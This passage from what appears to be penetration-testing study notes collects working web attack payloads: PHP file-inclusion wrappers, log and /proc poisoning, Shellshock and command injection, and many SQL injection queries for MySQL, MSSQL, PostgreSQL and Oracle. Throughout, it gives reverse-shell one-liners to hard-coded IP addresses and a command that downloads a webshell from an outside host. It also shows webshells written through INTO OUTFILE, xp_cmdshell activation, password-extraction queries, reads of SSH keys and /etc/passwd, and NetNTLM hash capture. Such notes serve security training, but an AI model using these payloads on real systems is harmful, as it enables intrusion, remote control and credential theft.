<h2 id="4-using-the-php-wrapper-phpfilter"><a class="header" href="#4-using-the-php-wrapper-phpfilter">4. Using the PHP wrapper php://filter</a></h2>
<pre><code>http://localhost/include.php?page=php://filter/convert.base64-encode/resource=secret.inc
http://localhost/include.php?page=php://filter/read=convert.base64-encode/resource=secret.inc
http://localhost/include.php?page=php://filter/resource=/etc/passwd
</code></pre>
<h2 id="5-using-php-input-stream"><a class="header" href="#5-using-php-input-stream">5. Using PHP input:// stream</a></h2>
<p>POST</p>
<pre><code>/fi/?page=php://input&amp;cmd=ls
</code></pre>
<h2 id="6-using-datatextplainbase64command"><a class="header" href="#6-using-datatextplainbase64command">6. Using data://text/plain;base64,command</a></h2>
<pre><code>data://text/plain;base64,[command encoded in base64]
or
data://text/plain,&lt;?php shell_exec($_GET['cmd']);?&gt;  
</code></pre>
<p>ex:</p>
<pre><code>http://example.com/Keeper.php?page=data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=  
http://example.com/Keeper.php?page=data://text/plain,&lt;?system('id');?&gt;  
</code></pre>
<h2 id="7-using-procselfenviron"><a class="header" href="#7-using-procselfenviron">7. Using /proc/self/environ</a></h2>
<p>Another popular technique is to manipulate the Process Environ file. In a nutshell, when a process is created and has an open file handler then a file descriptor will point to that requested file.</p>
<p>Our main target is to inject the /proc/self/environ file from the HTTP Header: User-Agent. This file hosts the initial environment of the Apache process. Thus, the environmental variable User-Agent is likely to appear there.</p>
<pre><code>curl http://secureapplication.example/index.php?view=../../../proc/self/environ
</code></pre>
<p>response:</p>
<pre><code>HTTP_USER_AGENT="curl/" &lt;/body&gt;
</code></pre>
<p>so we can inject something like a webshell</p>
<pre><code>curl -H "User-Agent: &lt;?php system('wget http://10.10.14.6/webshell.php -O webshell.php')" http://target.com

curl http://target.com/webshell.php&amp;cmd=ls

</code></pre>
<h2 id="8-using-procselffd"><a class="header" href="#8-using-procselffd">8. Using /proc/self/fd</a></h2>
<p>brute force the fd until you see “referer” /proc/self/fd/{number} then</p>
<pre><code>curl -H "Referer: &lt;?php phpinfo(); ?&gt;" http://target.com
</code></pre>
<h2 id="9-using-zip"><a class="header" href="#9-using-zip">9. Using zip</a></h2>
<p>Upload a ZIP file containing a PHP shell compressed and access:</p>
<pre><code>example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
</code></pre>
<h2 id="10-using-log-files-with-controllable-input-like"><a class="header" href="#10-using-log-files-with-controllable-input-like">10. Using log files with controllable input like:</a></h2>
<pre><code>  . /var/log/apache/access.log
  . /var/log/apache/error.log
  . /var/log/vsftpd.log
  . /var/log/sshd.log
  . /var/log/mail
</code></pre>
<h1 id="5-common-files-location"><a class="header" href="#5-common-files-location">5 Common files location</a></h1>
<hr />
<p>https://wiki.apache.org/httpd/DistrosDefaultLayout<br />
<strong>Common log file location</strong><br />
<strong>Ubuntu, Debian</strong></p>
<pre><code>/var/log/apache2/error.log  
/var/log/apache2/access.log  
</code></pre>
<p><strong>Red Hat, CentOS, Fedora, OEL, RHEL</strong></p>
<pre><code>/var/log/httpd/error_log  
/var/log/httpd/access_log  
</code></pre>
<p><strong>FreeBSD</strong></p>
<pre><code>/var/log/httpd-error.log  
/var/log/httpd-access.log  
</code></pre>
<p><strong>Common Config file location</strong></p>
<p>check any restriction or hidden path on accessing the server</p>
<p><strong>Ubuntu</strong></p>
<pre><code>/etc/apache2/apache2.conf  
/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  
</code></pre>
<p><strong>FreeBSD</strong></p>
<pre><code>/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  
</code></pre>
<p><strong>root/user ssh keys? .bash_history?</strong></p>
<pre><code>/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/root/.ssh/known_hosts
</code></pre>
<h1 id="10-command-injection"><a class="header" href="#10-command-injection">1.0 Command injection</a></h1>
<hr />
<p>If the application executes system commands based on user input and it is not sanitized, commands can be run on the server, e.g.:</p>
<pre><code>  https://vulnerable.io/test.php?id=1 &amp;&amp; nc -e /bin/sh 130.10.10.16 4444

</code></pre>
<p>in javascript if you use eval(), setTimeout(), setInterval(), Function() you can also do js injection</p>
<pre><code>  process.kill(process.pid)
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="shell-shock"><a class="header" href="#shell-shock">Shell Shock</a></h2>
<h3 id="detect"><a class="header" href="#detect">Detect</a></h3>
<pre><code>nikto -h http://&lt;IP&gt;/
OR
nmap &lt;IP&gt; -p 80 --script=http-shellshock --script-args uri=/cgi-bin/admin.cgi
</code></pre>
<h3 id="attack"><a class="header" href="#attack">Attack</a></h3>
<pre><code>wget -qO- -U "() { test;};echo "Content-type: text/plain"; echo; echo; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.235",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 2&gt;&amp;1" http://&lt;IP&gt;/cgi-bin/admin.cgi
OR
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i &gt;&amp; /dev/tcp/&lt;Attacker IP&gt;/4444 0&gt;&amp;1; echo zzzz;'" http://&lt;Victim-IP&gt;/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
</code></pre>
<h3 id="shellshock---cve-2014-6271"><a class="header" href="#shellshock---cve-2014-6271">Shellshock - CVE-2014-6271</a></h3>
<pre><code>Apache mod_cgi or any CGI information ? Could be vulnerable to shellshock
# Shellshock == CVE-2014-6271

# Classic PoC
curl -H "User-Agent: () { :; }; /bin/command" http://example.com/
() {:;}; /bin/cat /etc/passwd

# Reverse shell
() { :; }; /bin/sh -c /bin/sh -i  &gt;&amp; /dev/tcp/139.99.169.198/51337 0&gt;&amp;1 &amp;

# Reverse Shell
curl -H "User-Agent: () { :;};echo content-type:text/plain;echo;/bin/nc 51.75.29.235 2222 -e /bin/bash;echo;exit" http://vuln.com/script.cgi

# Automatic tool : shellshocker.py
https://github.com/liamim/shellshocker

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="github"><a class="header" href="#github">Github</a></h2>
<h3 id="links-8"><a class="header" href="#links-8">Links</a></h3>
<ul>
<li><a href="https://github.com/arthaud/git-dumper">Github Dump Tool</a></li>
<li><a href="https://www.howtogeek.com/devops/how-to-view-commit-history-with-git-log/">Github Commit History</a></li>
</ul>
<p>GIT Commit Dump - whenever you see some github files on the Victim machine, Exfiltrate it and refer to the following resources</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="sql"><a class="header" href="#sql">SQL</a></h2>
<h3 id="links-9"><a class="header" href="#links-9">Links</a></h3>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md">Payload All The Things</a></li>
<li><a href="https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/">MSSQL Cheat Sheet</a></li>
<li><a href="https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/">SQL Injection Cheat Sheet</a></li>
<li><a href="https://bhavsec.com/posts/mssql-rce/">From MSSQL to RCE</a></li>
</ul>
<h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
<p>Only Resources you will need to get Remote code using SQLi</p>
<h3 id="mysql"><a class="header" href="#mysql">MYSQL</a></h3>
<h4 id="authenticated-sqli"><a class="header" href="#authenticated-sqli">Authenticated SQLi</a></h4>
<pre><code>SELECT version();
SELECT system_user();
show databases;

SHOW TABLES FROM database_name;
OR
use &lt;db_name&gt;
show tables;
describe users; # describes columns in users' table

SELECT * from &lt;test&gt;.&lt;users&gt;; # here test is DB and the user is a table in test db
SELECT user, authentication_string FROM mysql.user WHERE user = 'test';bash
</code></pre>
<h4 id="error-based-sqli"><a class="header" href="#error-based-sqli">Error based SQLi</a></h4>
<pre><code>tom' OR 1=1 -- //
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- // # password for admin user
</code></pre>
<h4 id="union-based-sqli"><a class="header" href="#union-based-sqli">Union-based SQLi</a></h4>
<pre><code>*** injected UNION query has to include the same number of columns in the original query
*** Data types need to be compatible between each column

1) Finding the number of Columns
' ORDER BY 1-- // # Keep incrementing value of 1 to find columns

2) Finding name, user, and version
%' UNION SELECT database(), user(), @@version, null, null -- // # %' is used for closing the search parameter 
# Assume we got 5 columns on step 1, we are using 3 columns and leaving 2 as null here

2.1) Finding name, user, and version
# Sometimes column 1 is reserved for the ID field so no proper value comes and we try this instead
' UNION SELECT null, null, database(), user(), @@version  -- //

3) Enumerating table names, column names, and db_name
' UNION SELECT null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
# 1 and 5 are kept null
# we see a table called users, let's dive into that

4) Enumrating few columns from the user table found above
' UNION SELECT null, username, password, description, null FROM users -- //
</code></pre>
<h3 id="example-from-dc-9-on-pg"><a class="header" href="#example-from-dc-9-on-pg">Example from DC-9 on PG</a></h3>
<p>https://grumpygeekwrites.wordpress.com/2021/06/06/dc-9-vulnhub-walk-through-tutorial-writeup/</p>
<pre><code>- mary' and 1=1 #
- mary' order by 1 #
- mary' order by 6 #
- mary' order by 7 #
- mary' union select version(),user(),database(),4,5,6 #
- mary' union select 1,group_concat(schema_name),3,4,5,6 from information_schema.schemata #
- mary' union select group_concat(table_name),2,3,4,5,6 from information_schema.tables where table_schema=database() #
- mary' union select group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name='Users' #
- mary' union select group_concat(Username,":",Password),2,3,4,5,6 from Users #

- mary' union SELECT concat(schema_name),2,3,4,5,6 FROM information_schema.schemata -- ;
- mary' union SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='Staff' -- ;
- mary' union SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='users' -- ;
- mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'StaffDetails' -- ;
- mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'Users' -- ;
- mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'UserDetails' -- ;
- mary' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;

- cat userPass | tr "," "\n"
- `cut -d ":" -f1 userPass2`  
- `cut -d ":" -f2 userPass2`
- mary' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM Staff.Users-- ;
</code></pre>
<h3 id="mssql"><a class="header" href="#mssql">MSSQL</a></h3>
<h4 id="authenticated-sqli-1"><a class="header" href="#authenticated-sqli-1">Authenticated SQLi</a></h4>
<pre><code>SELECT @@version;
SELECT name FROM sys.databases; # master, tempdb, model and msdb are default
SELECT * FROM offsec.information_schema.tables; # Returns table for offsec db
'''
offsec
dbo
users
'''
SELECT * from testuser.dbo.users; # We select dbo table schema between the db and table name
admin lab # user # pass
guest guest  # user # pass
</code></pre>
<h4 id="postgresql-command-execution"><a class="header" href="#postgresql-command-execution">PostgreSQL Command Execution</a></h4>
<h5 id="cve-2019-9193"><a class="header" href="#cve-2019-9193">CVE-2019-9193</a></h5>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md">PayloadAllTheThings_PostgreSQL</a></p>
<pre><code>#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'id';

COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.193 4444 &gt;/tmp/f';

SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
</code></pre>
<h4 id="extra-notes-i-had"><a class="header" href="#extra-notes-i-had">Extra Notes I had</a></h4>
<pre><code>#### Line Comments

**Comments out rest of the query.**   
Line comments are generally useful for ignoring rest of the query so you don’t have to deal with fixing the syntax.

- `--` (Postgres and MS SQL and MySQL) `DROP sampletable;--` 
- `#` (MySQL) `DROP sampletable;#`

##### Line Comments Sample SQL Injection Attacks

- Username: `admin'--`
- `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password'` This is going to log you as admin user, because rest of the SQL query will be ignored.


**Executing more than one query in one transaction**. This is very useful in every injection point, especially in SQL Server back ended applications.

- `;` (MS SQL)   
    `SELECT * FROM members; DROP members--`

### If Statements

Get response based on an if statement. This is **one of the key points of Blind SQL Injection**, also can be very useful to test simple stuff blindly and **accurately**.

#### MySQL If Statement

- `IF(**_condition_,_true-part_,_false-part_**)` (M) `SELECT IF(1=1,'true','false')`

#### SQL Server If Statement

- `IF **_condition_** **_true-part_** ELSE **_false-part_**` (S)   
    `IF (1=1) SELECT 'true' ELSE SELECT 'false'`

#### PostgreSQL If Statement

- `SELECT CASE WHEN **_condition_** THEN **_true-part_** ELSE **_false-part_**` END; (P)   
    `SELECT CASE WEHEN (1=1) THEN 'A' ELSE 'B'END;`

##### If Statement SQL Injection Attack Samples

`if ((select user) = 'sa' OR (select user) = 'dbo') select 1 else select 1/0` (S)   
This will throw an **divide by zero error** if current logged user is not **“sa” or “dbo”**.

## Union Injections

With union you do SQL queries cross-table. Basically you can poison query to return records from another table.

`SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members`   
This will combine results from both news table and members table and return all of them.

### Bypassing Login Screens (SMO+)

_SQL Injection 101_, Login tricks

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`
- ….
- Login as different user (SM*)   
    `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`

#### Finding how many columns in SELECT query by **ORDER BY** **(MSO+)**

Finding column number by ORDER BY can speed up the UNION SQL Injection process.

- `ORDER BY 1--`
- `ORDER BY 2--`
- `ORDER BY N--` _so on_

# Enabling xp_cmdshell for SQL Server 2005
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';
' UNION SELECT "&lt;?php system($_GET['cmd']);?&gt;", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
&lt;? system($_REQUEST['cmd']); ?&gt;

</code></pre>
<h4 id="error-based-sql-injection"><a class="header" href="#error-based-sql-injection">Error-Based SQL Injection</a></h4>
<ul>
<li><strong>Goal</strong>: To generate an error message from the SQL database.</li>
<li><strong>Method</strong>: Include SQL control characters or SQL code into a query.</li>
<li><strong>Example</strong>: Inputting <code>' OR 1=1 --</code> in a user input field. If the backend query is <code>SELECT * FROM users WHERE username = '[input]'</code>, it becomes <code>SELECT * FROM users WHERE username = '' OR 1=1 --'</code>.</li>
<li><strong>Result</strong>: The database returns an error or unexpected data, indicating vulnerability.</li>
</ul>
<h4 id="union-based-sql-injection"><a class="header" href="#union-based-sql-injection">Union-Based SQL Injection</a></h4>
<ul>
<li><strong>Goal</strong>: Retrieve data from other tables.</li>
<li><strong>Method</strong>: Utilize the <code>UNION</code> SQL operator to combine results from multiple SELECT queries.</li>
<li><strong>Example</strong>: Input <code>UNION SELECT username, password FROM users --</code>.
<ul>
<li>' UNION SELECT null, null, database(), user(), @@version  -- //</li>
</ul>
</li>
<li><strong>Consideration</strong>: Columns data types and number must match between the original and UNION query.</li>
</ul>
<h4 id="blind-sql-injection"><a class="header" href="#blind-sql-injection">Blind SQL Injection</a></h4>
<ul>
<li><strong>Goal</strong>: Retrieve data when no error message or data is directly returned.</li>
<li><strong>Method</strong>: Ask the database a true/false question and determine the answer based on the application's response.</li>
<li><strong>Example</strong>: Change a query to <code>SELECT * FROM users WHERE username = 'admin' AND 1=1 --</code>. If the page loads normally, the query is true. If it doesn't, the query is false.</li>
</ul>
<h4 id="time-based-sql-injection"><a class="header" href="#time-based-sql-injection">Time-Based SQL Injection</a></h4>
<ul>
<li><strong>Goal</strong>: Gather information from a database when no data is returned to the user.</li>
<li><strong>Method</strong>: Use SQL commands that delay the response.</li>
<li><strong>Example</strong>: <code>'; IF (SELECT COUNT(*) FROM users) &gt; 5 WAITFOR DELAY '0:0:10' --</code>. If the response is delayed, the statement is true.</li>
</ul>
<h3 id="notes-from-htb-streamio"><a class="header" href="#notes-from-htb-streamio">Notes from HTB StreamIO</a></h3>
<pre><code>It was MSSQL, and ended up blocking just 'OR' but not 'AND'

1408' OR 1=1     # BLocked

## Trial and Error to figure out there are six columns
-1' UNION SELECT 1,2,3,4,5,6--

## Get Version
-1' UNION SELECT 1,@@version,3,4,5,6--

## Get list of Databases
-1' UNION SELECT 1,name,3,4,5,6  FROM master.dbo.sysdatabases--

## Dig into the streamio database
-1' UNION SELECT 1,name,3,4,5,6  FROM streamio..sysobjects WHERE xtype ='U';-- -

-1' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -

-1' UNION SELECT 1,CONCAT(username,':',password),3,4,5,6 FROM users;-- -


Interesting way to quick connect to a database, mssql, on cli and get data you need:

sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h3 id="sql-injections"><a class="header" href="#sql-injections">SQL Injections</a></h3>
<h1 id="intro"><a class="header" href="#intro">Intro</a></h1>
<hr />
<h2 id="classes"><a class="header" href="#classes">Classes</a></h2>
<ul>
<li><strong>INBOUND</strong>
<blockquote>
<p>data is extracted using the same channel that is used to inject the SQL code.</p>
</blockquote>
</li>
<li><strong>OUT OF BAND</strong>
<blockquote>
<p>data is retrieved using a different channel</p>
</blockquote>
</li>
<li><strong>INFERENTIAL</strong>
<blockquote>
<p>there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behaviour</p>
</blockquote>
</li>
</ul>
<h2 id="types"><a class="header" href="#types">Types</a></h2>
<ul>
<li><strong>Error-based</strong>
<blockquote>
<p>the webpage show us an error</p>
</blockquote>
</li>
<li><strong>Union-based</strong>
<blockquote>
<p>The SQL UNION is used to combine the results of two or more SELECT SQL statements into a single result.</p>
</blockquote>
</li>
<li><strong>Blind-sql-injection</strong>
<blockquote>
<p>check with time or different information showing</p>
</blockquote>
</li>
</ul>
<h2 id="methodology"><a class="header" href="#methodology">methodology</a></h2>
<ol>
<li>Identify injection and Injection type (with strings use ‘ with numbers dont)</li>
<li>Attack Error based</li>
<li>Attack Union based</li>
<li>Attack Blind</li>
</ol>
<h1 id="1-error-based-sql"><a class="header" href="#1-error-based-sql">1 Error based SQL</a></h1>
<hr />
<h2 id="case-1-mssql"><a class="header" href="#case-1-mssql">case 1 MSSQL</a></h2>
<pre><code>http://[site]/page.asp?id=1 or 1=convert(int,(USER))--
</code></pre>
<ul>
<li>
<p>respuesta</p>
<pre><code>Syntax error converting the nvarchar value 'nombre_de_usuario' to a column of data type int
</code></pre>
<p>Grab the database user with USER Grab the database name with DB_NAME Grab the servername with @@servername Grab the Windows/OS version with @@version</p>
</li>
</ul>
<h2 id="case-2-mssql"><a class="header" href="#case-2-mssql">Case 2 MSSQL</a></h2>
<p>https://www.exploit-db.com/papers/12975/</p>
<ul>
<li>
<p>Enumerate column and table name</p>
<pre><code>http://www.example.com/page.asp?id=1' HAVING 1=1--
Error message: Column 'news.news_id' is invalid                 &lt; table_name.column
</code></pre>
<pre><code>http://www.example.com/page.asp?id=1' GROUP BY news.news_id HAVING 1=1--
Error message: Column 'news.news_author' is invalid           &lt; table_name.column2
</code></pre>
<pre><code>http://www.example.com/page.asp?id=1' GROUP BY news.news_id,news.news_author HAVING 1=1--
Error message: Column 'news.news_detail' is invalid             &lt; table_name.column3
</code></pre>
<p>Until no error</p>
</li>
<li>
<p>Enumerate version, db name, users:</p>
<pre><code>http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--
http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--
http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())--       &lt;&lt; Is the user running as dbo or sa?
</code></pre>
<pre><code>xp_cmdshell &lt;&lt; if running as database admin
http://www.example.com/news.asp?id=1; exec master.dbo.xp_cmdshell 'command'
'; exec master.dbo.xp_cmdshell 'command'
</code></pre>
</li>
</ul>
<p>On MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:</p>
<pre><code>EXEC sp_configure 'show advanced options', 1;--
RECONFIGURE;--
EXEC sp_configure 'xp_cmdshell', 1;--
RECONFIGURE;--  
</code></pre>
<p>On MSSQL 2000:</p>
<pre><code>EXEC sp_addextendedproc 'xp_anyname', 'xp_log70.dll';--
</code></pre>
<h1 id="2-union-based-sqli"><a class="header" href="#2-union-based-sqli">2 Union based SQLI</a></h1>
<hr />
<h2 id="case-1-mssql-1"><a class="header" href="#case-1-mssql-1">case 1 MSSQL</a></h2>
<p>Example :192.168.30.35/comment.php?id=437</p>
<pre><code>?id=738 order by 1
?id=738 order by 2
?id=738 order by n
hasta que aparece un error " unkown column 7 in order clause"
</code></pre>
<p>ex 2</p>
<pre><code>?id=738 union select 1,2,3,4,5,6
</code></pre>
<p>ex 3</p>
<pre><code>?id=-1 union select 1,2,3,4,@@version,6
?id=-1 union select 1,2,3,4,user(),6
</code></pre>
<p>ex 4</p>
<pre><code>?id=-1 union select 1,2,3,4,table_name,6 FROM information_schema tables
</code></pre>
<p>then</p>
<pre><code>?id=-1 union all select 1,2,3,4,column_name,6 FROM information_schema columns where table_name='users'
esto nos devuelve que hay 4 columnas, id name password y country
</code></pre>
<p>then</p>
<pre><code>id=-1 union select 1,2,name,4,password,6 FROM users
</code></pre>
<h2 id="case-2-mysql"><a class="header" href="#case-2-mysql">case 2 MySQL</a></h2>
<ul>
<li>
<p>enumerate columns</p>
<pre><code>http://[site]/page.php?id=1 order by 1/*
http://[site]/page.php?id=1 order by 2/*
http://[site]/page.php?id=1 order by 5/*
5 gives a valid page
</code></pre>
</li>
<li>
<p>union</p>
<pre><code>http://[site]/page.php?id=1 union all select 1,2,3,4,5/
gives a valid page
</code></pre>
<p>Change the first part of the query to a null or negative value so we can see</p>
<pre><code>http://[site]/page.php?id=-1 union all select 1,2,3,4,5/*
prints only 2 and 3
</code></pre>
</li>
<li>
<p>grab info</p>
<pre><code>http://[site]/page.php?id=null union all select 1,user(),3,4,5/*
http://[site]/page.php?id=null union all select 1,2,database(),4,5/*
http://[site]/page.php?id=null union all select 1,@@version,@@datadir,4,5/*
</code></pre>
</li>
</ul>
<h1 id="3-blind-sqli"><a class="header" href="#3-blind-sqli">3 Blind SQLi</a></h1>
<hr />
<h2 id="case-1-mssql-2"><a class="header" href="#case-1-mssql-2">case 1 MSSQL</a></h2>
<pre><code>http://[site]/page.asp?id=1; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'--
...
etc until we wait for 10 secs
</code></pre>
<ul>
<li>
<p>to extract the user name:</p>
<pre><code>http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;97) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))&gt;98) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),1,1)))=100) WAITFOR DELAY '00:00:10'--
hangs for 10 seconds
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))&gt;97) WAITFOR DELAY '00:00:10'--
http://[site]/page.asp?id=1; IF (ASCII(lower(substring((USER),2,1)))=98) WAITFOR DELAY '00:00:10'-- (+10 seconds)
hangs for 10 seconds
</code></pre>
<p>and so on</p>
</li>
</ul>
<p>we can try</p>
<pre><code>id=738-sleep(5)  &lt;-si vemos que tarda es por que el input es injectable
select IF(MID(@@version,1,1) = '5',SLEEP(5),0)
</code></pre>
<p>We can also try with an and to see if it brings results or not</p>
<pre><code>id=6 and 1=1
id=6 and 1=2
</code></pre>
<p>We ASSUME it is injectable and look for a file with load_file</p>
<pre><code>id=738 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
</code></pre>
<p>We create a php</p>
<pre><code>id=738 union all select 1,2,3,4,"&lt;?php echo shell_exec($_GET['cmd'];?&gt;",6 into OUTFILE'c:/xampp/htdocs/backdoor.php'
</code></pre>
<p>With blind SQL injection vulnerabilities, many techniques such as UNION attacks are not effective</p>
<h2 id="exploiting-blind-sql-injection-by-triggering-conditional-responses"><a class="header" href="#exploiting-blind-sql-injection-by-triggering-conditional-responses">Exploiting blind SQL injection by triggering conditional responses</a></h2>
<p>Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:</p>
<p>Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4</p>
<p>When a request containing a TrackingId cookie is processed, the application determines whether this is a known user using an SQL query like this:</p>
<pre><code>SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
</code></pre>
<p>This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If it returns data (because a recognized TrackingId was submitted), then a “Welcome back” message is displayed within the page.</p>
<pre><code>xyz' UNION SELECT 'a' WHERE 1=1-- &lt;&lt; shows welcome back
xyz' UNION SELECT 'a' WHERE 1=2--  &lt;&lt; shows nothing
</code></pre>
<p>try to gues the password for Administrator:</p>
<pre><code>xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 'm'--
xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) &gt; 't'--
</code></pre>
<p>We can continue this process to systematically determine the full password for the Administrator user.</p>
<h2 id="inducing-conditional-responses-by-triggering-sql-errors"><a class="header" href="#inducing-conditional-responses-by-triggering-sql-errors">Inducing conditional responses by triggering SQL errors</a></h2>
<p>To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:</p>
<pre><code>xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END--
</code></pre>
<p>These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true. With the first input, the case expression evaluates to NULL, which does not cause any error. With the second input, it evaluates to 1/0, which causes a divide-by-zero error. Assuming the error causes some difference in the application’s HTTP response, we can use this difference to infer whether the injected condition is true.</p>
<p>Using this technique, we can retrieve data in the way already described, by systematically testing one character at a time:</p>
<pre><code>xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) &gt; 'm') then 1/0 else null end from users—
</code></pre>
<h2 id="exploiting-blind-sql-injection-by-triggering-time-delays"><a class="header" href="#exploiting-blind-sql-injection-by-triggering-time-delays">Exploiting blind SQL injection by triggering time delays</a></h2>
<pre><code>'; IF (1=2) WAITFOR DELAY '0:0:10'--
'; IF (1=1) WAITFOR DELAY '0:0:10'--
</code></pre>
<ul>
<li>
<p>attack</p>
<pre><code>'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) &gt; 'm') = 1 WAITFOR DELAY '0:0:{delay}'—
</code></pre>
</li>
</ul>
<h1 id="mssql-capture-and-crack-netntlm-hash"><a class="header" href="#mssql-capture-and-crack-netntlm-hash">mssql Capture and crack NetNTLM hash</a></h1>
<hr />
<p>the MSSQL Server service account can be made to initiate a remote SMB connection using the command below.</p>
<pre><code>'+EXEC+master.sys.xp_dirtree+'\\10.10.14.9\share--
</code></pre>
<p>If we run respond on 10.10.14.9 we will paste hashes</p>
<h1 id="sql-filter-bypass"><a class="header" href="#sql-filter-bypass">SQL filter bypass</a></h1>
<hr />
<p>Beyond SQLi: Obfuscate and Bypass - https://www.exploit-db.com/papers/17934/</p>
<p>AND, OR operators AND = &amp;&amp; OR = ||</p>
<p>Comment operator « Mysql</p>
<pre><code>--  	
#  
/**/  
</code></pre>
<h3 id="retrieving-multiple-values-within-a-single-column-string-concatenation"><a class="header" href="#retrieving-multiple-values-within-a-single-column-string-concatenation">Retrieving multiple values within a single column STRING CONCATENATION</a></h3>
<p>In the preceding example, suppose instead that the query only returns a single column.</p>
<p>You can easily retrieve multiple values together within this single column by concatenating the values together, ideally including a suitable separator to let you distinguish the combined values. For example, on Oracle you could submit the input:</p>
<pre><code>' UNION SELECT username || '~' || password FROM users--
</code></pre>
<p>This uses the double-pipe sequence || which is a string concatenation operator on Oracle. The injected query concatenates together the values of the username and password fields, separated by the ~ character.</p>
<h2 id="examining-the-database-in-sql-injection-attacks"><a class="header" href="#examining-the-database-in-sql-injection-attacks">Examining the database in SQL injection attacks</a></h2>
<h3 id="oracle"><a class="header" href="#oracle">ORACLE</a></h3>
<p>On Oracle, you can obtain the same information with slightly different queries.</p>
<p>You can list tables by querying all_tables:</p>
<p>SELECT * FROM all_tables</p>
<p>And you can list columns by querying all_tab_columns:</p>
<p>SELECT * FROM all_tab_columns WHERE table_name = ‘USERS’</p>
